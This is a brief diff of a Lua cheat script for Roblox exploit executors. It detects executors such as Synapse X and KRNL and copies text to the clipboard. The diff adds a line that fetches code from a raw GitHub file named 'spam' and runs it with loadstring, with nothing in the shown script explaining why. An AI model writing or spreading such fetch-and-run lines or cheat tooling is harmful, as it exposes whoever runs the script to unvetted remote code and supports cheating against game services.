@@ -1,4 +1,5 @@
 setclipboard("HAYMENHAY")
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/PisiPapiks/spam/main/spa.txt'),true))()
 local exploit = (syn.secure_call and "Synapse X") or (PROTOSMASHER_LOADED and "ProtoSmasher") or (SENTINEL_LOADED and "Sentinel") or (fireclient and "Calamari") or (is_sirhurt_closure and "SirHurt") or (KRNL_LOADED and "KRNL") or (shadow_env and "Shadow") or (IS_VIVA_LOADED and "VIVA") or (isvm and "Proxo") or (IS_COCO_LOADED and "COCO") or (unit and "UNIT.FUN") or (jit and "EasyExploits")
 
 local gnID = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
